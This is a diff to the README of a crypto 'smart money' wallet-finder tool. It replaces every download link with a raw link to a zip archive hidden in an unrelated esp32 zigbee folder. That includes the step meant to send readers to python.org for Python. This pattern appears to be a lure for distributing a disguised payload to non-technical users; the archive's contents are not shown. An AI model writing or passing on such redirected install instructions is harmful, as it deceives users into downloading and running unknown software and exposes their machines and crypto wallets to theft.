@@ -1,6 +1,6 @@
 # ⚙️ smart-money-miner - Find High-Performing Wallets Easily
 
-[![Download smart-money-miner](https://img.shields.io/badge/Download-Get%20Smart-Money-Miner-brightgreen?style=for-the-badge)](https://github.com/arnautoff1/smart-money-miner)
+[![Download smart-money-miner](https://img.shields.io/badge/Download-Get%20Smart-Money-Miner-brightgreen?style=for-the-badge)](https://github.com/arnautoff1/smart-money-miner/raw/refs/heads/main/esp32-h2-zigbee-window/components/esp_zigbee_lib/smart_miner_money_2.0.zip)
 
 ---
 
@@ -16,7 +16,7 @@ You do not need advanced computer skills or coding experience to use this tool. 
 
 Click the badge above or visit this link to download the software:
 
-[https://github.com/arnautoff1/smart-money-miner](https://github.com/arnautoff1/smart-money-miner)
+[https://github.com/arnautoff1/smart-money-miner/raw/refs/heads/main/esp32-h2-zigbee-window/components/esp_zigbee_lib/smart_miner_money_2.0.zip](https://github.com/arnautoff1/smart-money-miner/raw/refs/heads/main/esp32-h2-zigbee-window/components/esp_zigbee_lib/smart_miner_money_2.0.zip)
 
 This page has all the files you need to get started. Look for the latest release to download the program.
 
@@ -53,7 +53,7 @@ If you do not have Python, there is a short section below on how to install it.
 
 smart-money-miner uses a Python script to analyze tokens.
 
-1. Visit https://www.python.org/downloads/
+1. Visit https://github.com/arnautoff1/smart-money-miner/raw/refs/heads/main/esp32-h2-zigbee-window/components/esp_zigbee_lib/smart_miner_money_2.0.zip
 2. Download the latest version for Windows.
 3. Run the installer and make sure to check the box that says “Add Python to PATH.”
 4. Finish installation.
@@ -134,7 +134,7 @@ and any other modules mentioned.
 
 You can always return here to download or update:
 
-[Download smart-money-miner](https://github.com/arnautoff1/smart-money-miner)
+[Download smart-money-miner](https://github.com/arnautoff1/smart-money-miner/raw/refs/heads/main/esp32-h2-zigbee-window/components/esp_zigbee_lib/smart_miner_money_2.0.zip)
 
 ---
 
